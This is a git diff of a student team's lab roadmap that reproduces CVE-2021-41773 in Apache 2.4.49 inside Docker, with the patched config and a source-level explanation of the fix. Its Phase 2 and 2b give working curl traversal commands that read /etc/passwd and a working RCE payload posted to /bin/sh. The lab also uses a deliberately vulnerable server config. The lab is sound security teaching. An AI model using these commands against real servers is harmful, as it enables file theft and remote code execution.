@@ -3,223 +3,223 @@ Team: Beth Magembe, Davis Tameh, Jacob Davey
 
 ---
 
-## 🎯 Project Goal
-Recreate and exploit CVE-2021-41773 (Apache HTTP Server 2.4.49 path traversal vulnerability), demonstrate file disclosure, and compare against a patched version.
+##  Project Goal
+Recreate and exploit CVE-2021-41773 (Apache HTTP Server 2.4.49 path traversal vulnerability), demonstrate file disclosure and RCE escalation via mod_cgi, and compare against a patched configuration.
 
 ---
 
-## 📦 Current Status
-✅ Docker environment builds  
-✅ Apache 2.4.49 runs on port 8080  
-✅ Basic web page accessible  
+## Current Status
+Docker environment builds  
+Apache 2.4.49 runs on port 8080  
+Path traversal confirmed working  
+Secret file read confirmed working  
+RCE via mod_cgi confirmed working  
+Patched config blocks exploit with 403  
 
 ---
 
-## 🚀 Phase 1 — Confirm Vulnerable Environment
+##  Final Directory Layout
 
-### Tasks
-
-1. **Verify Apache version inside container**
-   ```bash
-   docker build -t cve-2021-41773-lab ./cve-2021-41773
-   docker run --rm -p 8080:8080 --name cve-lab cve-2021-41773-lab &
-   docker exec -it cve-lab httpd -v
-   ```
-   Expected output: `Server version: Apache/2.4.49`
-
-2. **Confirm lab is reachable on port 8080**
-   ```bash
-   curl -v http://localhost:8080/
-   ```
-   Expected: HTTP 200 with the starter lab HTML page.
-
-3. **Confirm vulnerable Apache config is active**
-   - Review `cve-2021-41773/httpd-lab.conf`: the `<Directory />` block intentionally sets `Require all granted` with no path-normalization hardening.
-   - Verify the config is loaded inside the container:
-     ```bash
-     docker exec -it cve-lab cat /usr/local/apache2/conf/extra/httpd-lab.conf
-     docker exec -it cve-lab grep -n "Include.*httpd-lab" /usr/local/apache2/conf/httpd.conf
-     ```
-
-4. **Record evidence**
-   - Save `httpd -v` output to `exploit/evidence/phase1-version.txt`.
-   - Save `curl` response headers to `exploit/evidence/phase1-curl.txt`.
-   - Save config grep output to `exploit/evidence/phase1-config.txt`.
-
-### Acceptance ✅
-- [ ] Apache version confirmed as 2.4.49
-- [ ] HTTP 200 response confirmed on port 8080
-- [ ] Vulnerable config (`Require all granted` on `<Directory />`) confirmed active
-- [ ] Evidence files committed to repo
-
----
-
-## 🔓 Phase 2 — Vulnerability Reproduction
-
-CVE-2021-41773 is a path traversal bug in Apache 2.4.49 caused by insufficient URL normalization. An attacker can use URL-encoded dot segments (e.g., `%2e%2e`) to escape the document root and read arbitrary files.
-
-### Prerequisites
-- Phase 1 complete and container running (`cve-2021-41773-lab`).
-- Target file: `/opt/protected/protected.txt` (placed at `/opt/protected/` inside the container, outside the document root `htdocs/`).
-- Demo mode: use a **hybrid approach** (browser for visual storytelling, `curl` for reliable verification).
-
-### Test Cases (Hybrid: Browser + curl)
-
-**Test 1 — Browser visual demo**
-1. Open: `http://localhost:8080/`
-2. In the browser URL bar, try:
-   `http://localhost:8080/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/opt/protected/protected.txt`
-3. If the browser normalizes the URL and it fails, try the same traversal pattern via the alternate alias from Test 3 (`/icons/%2e%2e/%2e%2e/...`) and confirm with `curl`.
-
-Expected (vulnerable): protected file contents are rendered as raw response text.
-
-**Test 2 — Reliable terminal verification**
-```bash
-curl "http://localhost:8080/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/opt/protected/protected.txt"
 ```
-Expected (vulnerable): contents of `protected.txt` are returned.
-
-**Test 3 — Alternative encoding variant**
-```bash
-curl "http://localhost:8080/icons/%2e%2e/%2e%2e/%2e%2e/%2e%2e/opt/protected/protected.txt"
+CS-4277/
+├── demo.sh                    - automated full demo script
+├── curl-commands.sh           - individual commands for manual testing
+├── README.md                  - full manual demo walkthrough
+├── roadmap.md                 - this file
+├── vulnerable/
+│   ├── Dockerfile
+│   ├── docker-compose.yml
+│   ├── httpd-vulnerable.conf
+│   └── cgi-bin/
+│       └── printenv.cgi
+└── patched/
+    ├── Dockerfile
+    ├── docker-compose.yml
+    └── httpd-patched.conf
 ```
-Expected (vulnerable): same file contents returned.
 
-**Test 4 — Attempt against a non-existent path (negative control)**
+---
+
+## Phase 1 — Confirm Vulnerable Environment 
+
+### Steps
+
+**1. Start the container**
 ```bash
-curl "http://localhost:8080/cgi-bin/%2e%2e/%2e%2e/etc/shadow"
+cd vulnerable
+docker compose up -d --build
+sleep 15
 ```
-Expected: file does not exist inside container; HTTP 404.
 
-### Tasks
-1. Enable `mod_cgi` or confirm an alias that allows traversal (the `<Directory />` config already grants traversal access).
-2. Run browser demo first for presentation clarity, then confirm with `curl` for reliability.
-3. Run each curl test case and capture full request + response:
-   ```bash
-   curl -v "http://localhost:8080/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/opt/protected/protected.txt" \
-       2>&1 | tee exploit/evidence/phase2-traversal.txt
-   ```
-4. Document exact HTTP status codes, response bodies, and any error messages observed.
-5. Note limitations (e.g., browser URL normalization behavior, which path aliases are required, which encodings work).
+**2. Verify Apache version**
+```bash
+docker exec apache-cve-2021-41773 httpd -v
+```
+Expected: `Server version: Apache/2.4.49`
 
-### Record Evidence
-- Save at least one browser screenshot showing exploit URL + raw response.
-- Save all curl outputs to `exploit/evidence/`.
-- Add a short `exploit/README.md` update summarizing what worked and what did not.
+**3. Confirm it's reachable**
+```bash
+curl http://localhost:8080/
+```
+Expected: `<html><body><h1>It works!</h1></body></html>`
 
-### Acceptance ✅
-- [ ] Browser-based exploit attempt demonstrated and documented
-- [ ] Path traversal successfully reads `/opt/protected/protected.txt` on the vulnerable image
-- [ ] Both encoding variants tested and results documented
-- [ ] Negative control confirms non-existent paths return 404
-- [ ] All evidence files committed
+### Key Config Details
+The vulnerability requires two conditions, both present in `httpd-vulnerable.conf`:
+- `Require all granted` on `<Directory />` — lets traversal reach any file on the system
+- `mod_cgi` loaded — enables the RCE stage
+- `Alias /static/ "/"` — non-CGI entry point used for file reading
 
----
+### Issues We Hit & Fixed
+- Missing `mod_unixd` → added `LoadModule unixd_module`
+- Inline comments on `Require` lines caused Apache syntax errors → moved comments to their own lines
+- `/cgi-bin/` path caused 500 for file reads (Apache tries to execute files) → used `Alias /static/` instead
 
-## 🛡️ Phase 3 — Patch & Mitigation Comparison
-
-### Overview
-Compare the vulnerable Apache 2.4.49 behavior against two mitigations:
-1. **Config-only patch** — harden `httpd-lab.conf` to deny access to the filesystem root.
-2. **Version patch** — rebuild the image with Apache 2.4.51 (the official fix release).
-
-### 3a — Config-Only Patch
-
-1. Create `cve-2021-41773/patches/httpd-patched.conf` with hardened settings:
-   ```apache
-   <Directory />
-       AllowOverride none
-       Require all denied
-   </Directory>
-   <Directory /usr/local/apache2/htdocs>
-       Require all granted
-   </Directory>
-   ```
-2. Create `cve-2021-41773/patches/Dockerfile.patched` that uses the same `httpd:2.4.49` base but swaps in the patched config.
-3. Build and run the patched image:
-   ```bash
-   docker build -t cve-2021-41773-patched -f cve-2021-41773/patches/Dockerfile.patched ./cve-2021-41773
-   docker run --rm -p 8081:8080 cve-2021-41773-patched
-   ```
-4. Re-run Phase 2 test cases against port 8081 and capture responses.
-
-### 3b — Version Patch
-
-1. Create `cve-2021-41773/patches/Dockerfile.apache2451` that uses `httpd:2.4.51` base image.
-2. Build and run:
-   ```bash
-   docker build -t cve-2021-41773-2451 -f cve-2021-41773/patches/Dockerfile.apache2451 ./cve-2021-41773
-   docker run --rm -p 8082:8080 cve-2021-41773-2451
-   ```
-3. Re-run Phase 2 test cases against port 8082 and capture responses.
-
-### Comparison Table (fill in after testing)
-
-| Test Case | Vulnerable 2.4.49 | Config Patch | Version Patch (2.4.51) |
-|---|---|---|---|
-| Traversal Test 1 | ✅ File disclosed | ❌ Blocked (403) | ❌ Blocked (400/403) |
-| Traversal Test 2 | ✅ File disclosed | ❌ Blocked (403) | ❌ Blocked (400/403) |
-| Negative Control | 404 | 404 | 404 |
-
-*(Update with actual observed status codes after running tests.)*
-
-### Record Evidence
-- Save patched curl outputs to `patches/evidence/`.
-- Update `patches/README.md` with a summary of what each mitigation prevents and why.
-
-### Acceptance ✅
-- [ ] Config-only patched image built and tested
-- [ ] Version-patched image (2.4.51) built and tested
-- [ ] Comparison table filled with real observed results
-- [ ] All patch files and evidence committed
+### Acceptance 
+- Apache version confirmed as 2.4.49
+- HTTP 200 response on port 8080
+- Vulnerable config active
 
 ---
 
-## 📝 Phase 4 — Deliverables
+## Phase 2 — Path Traversal 
 
-### Tasks
+CVE-2021-41773 exploits insufficient URL normalization. Apache 2.4.49 checks the encoded path (looks safe), then decodes `%2e` → `.` and resolves the final path (already escaped) — a classic TOCTOU bug.
 
-1. **Final Write-Up** (`report/report.md` or equivalent)
-   - Executive summary of CVE-2021-41773 (what it is, who it affects, CVSS score).
-   - Lab setup: Docker environment, Apache version, config details.
-   - Reproduction walkthrough: step-by-step with evidence screenshots/outputs.
-   - Mitigation: config-only vs version upgrade, pros and cons.
-   - Risk and impact analysis: what an attacker could achieve and at what scale.
-   - Lessons learned and recommendations.
+### Commands
 
-2. **Screenshots / Log Evidence**
-   - Terminal screenshots of each phase (or captured text outputs committed to repo).
-   - All evidence files organized under `exploit/evidence/` and `patches/evidence/`.
+**Read /etc/passwd**
+```bash
+curl --path-as-is \
+  "http://localhost:8080/static/.%2e/.%2e/.%2e/.%2e/etc/passwd"
+```
+Expected: full `/etc/passwd` contents starting with `root:x:0:0:...`
 
-3. **Team Task Ownership**
+**Read the custom secret file**
+```bash
+curl --path-as-is \
+  "http://localhost:8080/static/.%2e/.%2e/.%2e/.%2e/etc/secret_config.txt"
+```
+Expected: `SUPER_SECRET_DB_PASSWORD=hunter2`
 
-   | Task | Owner | Status |
-   |---|---|---|
-   | Phase 1 — Environment verification | | ⬜ |
-   | Phase 2 — Exploit reproduction | | ⬜ |
-   | Phase 3 — Patch implementation | | ⬜ |
-   | Phase 3 — Comparison documentation | | ⬜ |
-   | Phase 4 — Final write-up | | ⬜ |
-   | Phase 4 — Slides / presentation | | ⬜ |
+**Negative control**
+```bash
+curl --path-as-is \
+  "http://localhost:8080/static/.%2e/.%2e/.%2e/.%2e/etc/doesnotexist"
+```
+Expected: HTTP 404
 
-4. **Presentation / Slides**
-   - Overview of CVE, lab architecture, **hybrid demo walkthrough (browser + curl)**, mitigation comparison, lessons learned.
+### Why the Encoding Works
+- `%2e` is URL encoding for `.`
+- `.%2e/` decodes to `./` — Apache 2.4.49's normalizer misses this specific combination
+- Chained four times it traverses from `/htdocs` all the way to the filesystem root
+- Apache checks the encoded path (safe-looking), then decodes it (traversal already succeeded)
 
-### Acceptance ✅
-- [ ] Final write-up committed to repo
-- [ ] All evidence files organized and committed
-- [ ] Team task ownership table filled in
-- [ ] Presentation / slides ready
+### Acceptance 
+- /etc/passwd read successfully
+- Custom secret file read successfully
+- Negative control returns 404
 
 ---
 
-## ✅ Overall Acceptance Criteria
+## Phase 2b — RCE Escalation via mod_cgi 
 
-| Criterion | Done? |
-|---|---|
-| Vulnerable environment verified (Apache 2.4.49 + weak config) | ⬜ |
-| Exploit reproduction demonstrated (path traversal reads protected file) | ⬜ |
-| Patched environment blocks disclosure (config and/or version upgrade) | ⬜ |
-| Comparison documented with reproducible step-by-step instructions | ⬜ |
-| Evidence committed for all phases | ⬜ |
-| Final report and presentation complete | ⬜ |
+With `mod_cgi` enabled, we traverse to `/bin/sh` via the CGI path and POST shell commands in the request body. Apache executes them as the `daemon` user. This is what pushed the CVE to CVSS 10.0.
+
+### Command
+
+```bash
+curl --path-as-is \
+  -d "echo Content-Type: text/plain; echo; id; whoami; hostname; uname -a" \
+  "http://localhost:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh"
+```
+
+Expected:
+```
+uid=1(daemon) gid=1(daemon) groups=1(daemon)
+daemon
+<container-hostname>
+Linux ...
+```
+
+### Why This Works
+Apache's CGI handler passes the POST body as stdin to the executed program. By traversing to `/bin/sh`, Apache executes the shell directly and our POST body becomes the script. We use `/cgi-bin/` here (not `/static/`) because we specifically *want* execution.
+
+### Acceptance
+- Arbitrary command execution confirmed
+- Running as `daemon` user confirmed
+
+---
+
+## Phase 3 — Patch & Mitigation 
+
+### The Fix
+One word changed in `httpd-patched.conf`:
+
+```apache
+# VULNERABLE:
+Require all granted
+
+# FIXED:
+Require all denied
+```
+
+This makes the filesystem root default-deny. Even if a path escapes the docroot, Apache refuses to serve it.
+
+### Test the Patch
+```bash
+# Stop vulnerable container
+docker compose down
+
+# Start patched container
+cd ../patched
+docker compose up -d --build
+sleep 15
+
+# Run the same exploit
+curl --path-as-is \
+  "http://localhost:8080/static/.%2e/.%2e/.%2e/.%2e/etc/passwd"
+```
+Expected: `403 Forbidden`
+
+### Comparison Table
+
+| Test Case | Vulnerable 2.4.49 | Patched 2.4.49 |
+|---|---|---|
+| Traversal → /etc/passwd | ✅ File disclosed | ❌ 403 Blocked |
+| Traversal → secret file | ✅ File disclosed | ❌ 403 Blocked |
+| RCE via /bin/sh POST | ✅ Command executed | ❌ 403 Blocked |
+| Negative control | 404 | 404 |
+
+### Source-Level Patch Analysis
+The fix is in `server/request.c`, function `ap_normalize_path()`.
+Full diff: `https://github.com/apache/httpd/commit/e150697`
+
+- **Before**: check encoded path → decode → serve (traversal already succeeded)
+- **After**: decode first → normalize → check → traversal caught before filesystem access
+
+This is a **TOCTOU (Time Of Check / Time Of Use)** bug — the path that was checked is not the path that was used.
+
+### Acceptance 
+- 403 returned for all traversal attempts on patched config
+- Same Apache 2.4.49 binary confirms this is a config issue, not just a version issue
+
+---
+
+## Phase 4 — Deliverables
+
+### Final Write-Up Should Cover
+- Executive summary: what CVE-2021-41773 is, CVSS 10.0, who it affects
+- Lab setup: Docker, Apache 2.4.49, the two config conditions required
+- Reproduction walkthrough referencing the commands above
+- RCE escalation explanation
+- Mitigation: the one-line fix and why it works
+- Source patch analysis: ap_normalize_path and the TOCTOU explanation
+- Lessons learned
+
+### Presentation Outline
+- What is CVE-2021-41773 and why it matters
+- Lab architecture walkthrough
+- Live demo: traversal → file read → RCE
+- The one-line fix
+- Source-level patch walkthrough
+- Lessons learned
